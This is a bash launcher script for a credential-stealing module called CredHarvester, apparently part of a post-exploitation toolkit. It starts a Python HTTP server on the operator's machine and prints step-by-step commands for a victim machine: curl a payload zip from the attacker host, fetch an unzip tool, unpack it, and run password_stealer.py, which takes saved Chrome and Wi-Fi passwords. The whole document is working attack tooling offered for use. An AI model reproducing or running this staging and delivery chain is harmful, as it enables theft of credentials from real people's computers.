#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'
LIP=$(ifconfig | grep inet)
GCP='get_chrome_pass.py'
GWP='get_wifi_pass.py'


echo -e "${RED}"
figlet CredHarvester
echo -e "${NC}"
cd /opt/creds_harvester
echo -e ""
echo -e "${W}CredHarvester can be used from local machine through a meterpreter session or through powershell on victim machine${NC}"
echo -e "${YLW}In the currect directory (${UBLUE}/opt/creds_harvester${NC}${YLW}) are the following scripts used in this module${NC}"
echo ""
echo -e "${ORNG}get_chrome_pass.py"
echo -e "get_wifi_pass.py"
echo -e "password_stealer ${RED}(Main Module)${NC}"
echo ""
echo -e "${LP}password_stealer.py ${W}must be executed on target with ${LP}${GCP}${W} & ${LP}${GWP}${W} all in the same directory${NC}"
echo -e "${W}whether that be locally or remotely${NC}"
echo ""
echo -e "${W}Below are your local IP's:"
echo "" 
echo -e "${LIP}"
echo ""
echo -e "${RED}Please enter your local IP${NC}"
read HOST 
echo -e "${ORNG}Starting Python HTTP Server on ${URED}${HOST}:8000${NC}"
xterm -e python3 -m http.server
echo -e "${W}Run the following commands to download ${UBLUE}CredHarvester${NC}${W} Post-Explotation scripts on target machine using CMD session."
echo ""
echo -e "${LP}1. ${UBLUE}Aquire Module on Target{NC}${LP}: ${YLW}curl http://${HOST}:8000/credH.zip --output credH.zip"
echo -e "${LP}2. ${UBLUE}CLI unzip for Windows CMD${NC}${LP}: ${YLW}curl http://stahlworks.com/dev/unzip.exe --output unzip.exe"
echo -e "${LP}3. ${UBLUE}Weaponize Module for Use${NC}${LP}: ${YLW}.\unzip.exe credH.zip -d .${NC}"
echo ""
echo -e "${LP}4. ${UBLUE}CredHarvester Execution${LP}: ${YLW}python password_stealer.py${NC}"
echo ""
echo ""
echo -e "${W}When you are done please hit enter to go back to Module Menu"
echo -e "Python HTTP Server will stay open on Port 8000 until xterm window is closed${NC}"
read RANDOM
cd /opt/sifter
sifter -m


##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################